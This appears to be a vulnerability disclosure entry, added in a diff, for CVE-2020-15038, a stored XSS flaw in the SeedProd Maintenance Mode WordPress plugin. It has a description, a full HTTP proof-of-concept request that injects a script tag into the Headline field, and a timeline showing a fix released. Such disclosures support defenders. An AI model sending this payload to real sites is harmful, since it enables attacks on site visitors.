@@ -1,0 +1,36 @@
+# Exploit Title: Wordpress Plugin Maintenance Mode by SeedProd 5.1.1 - Persistent Cross-Site Scripting
+# Date: 2020-06-22
+# Vendor Homepage: https://www.seedprod.com/
+# Vendor Changelog: https://wordpress.org/plugins/coming-soon/#developers
+# Exploit Author: Jinson Varghese Behanan (@JinsonCyberSec)
+# Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/stored-xss-coming-soon-page-maintenance-mode-plugin/
+# Author Homepage: https://www.jinsonvarghese.com
+# Version: 5.1.1 and below
+# CVE : CVE-2020-15038
+
+1. Description
+
+Coming Soon Page, Under Construction & Maintenance Mode by SeedProd is a popular WordPress Plugin with over 1 million active installations. The Headline field under the Page Settings section along with other fields in the plugin settings were found to be vulnerable to stored XSS, which gets triggered when the Coming Soon page is displayed (both in preview mode and live). All WordPress websites using Coming Soon Page, Under Construction & Maintenance Mode by SeedProd version 5.1.1 and below are affected.
+
+2. Proof of Concept
+
+POST /wp-admin/options.php HTTP/1.1
+Host: localhost:10004
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:10004/wp-admin/admin.php?page=seed_csp4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 636
+Origin: http://localhost:10004
+Connection: close
+Cookie: wordpress_7f1e0e8dff8818d1c2f579415daff8c7=jinson%7C1593950372%7C4GRNHaGPf0Fgg4gDEpeoNwijwEWzc3D3eVOlrvXniBi%7Cb9d2e047395f59871a0900e390bbd3d695bc5da3afb334da3d0ef5e8bf0c2f1b; wordpress_a024acb662ffd2f30d002a94ed1ea95c=jinson%7C1592914794%7CCgXYWBOtHL4ad8HOoBAQX49z08S9twTuGYVtVWqIbFp%7C01f69b63f0019268e8a42d1cefd95cd451b8ae990337af407b1caf9cb3fa99e5; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_7f1e0e8dff8818d1c2f579415daff8c7=jinson%7C1593950372%7C4GRNHaGPf0Fgg4gDEpeoNwijwEWzc3D3eVOlrvXniBi%7Cf1c8b238e06829673fea45a383730caae8b84cd0ac08b6f11fee65cd94cb8c16; PHPSESSID=44b22ef78b270abbd2351f1d858edb02; wordpress_logged_in_a024acb662ffd2f30d002a94ed1ea95c=jinson%7C1592914794%7CCgXYWBOtHL4ad8HOoBAQX49z08S9twTuGYVtVWqIbFp%7C317cd515fad907c4ae323798cca357f601c29999b20edbe8f9fdad02f35c53f7; wp-settings-time-1=1592745227; cookielawinfo-checkbox-non-necessary=yes; wp-settings-1=imgsize%3Dfull; cookielawinfo-checkbox-necessary=yes
+Upgrade-Insecure-Requests: 1
+
+option_page=seed_csp4_settings_content&action=update&_wpnonce=faced0b8ff&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dseed_csp4&seed_csp4_settings_content%5Bstatus%5D=1&seed_csp4_settings_content%5Blogo%5D=&seed_csp4_settings_content%5Bheadline%5D=%3Cscript%3Ealert%28%22Stored+XSS+in+Page+Headline%22%29%3C%2Fscript%3E&seed_csp4_settings_content%5Bdescription%5D=Proof+of+Concept&seed_csp4_settings_content%5Bfooter_credit%5D=0&submit=Save+All+Changes&seed_csp4_settings_content%5Bfavicon%5D=&seed_csp4_settings_content%5Bseo_title%5D=&seed_csp4_settings_content%5Bseo_description%5D=&seed_csp4_settings_content%5Bga_analytics%5D=
+
+3. Timeline
+
+Vulnerability reported to the SeedProd team – June 22, 2020
+Version 5.1.2 containing the fix to the vulnerability released – June 24, 2020
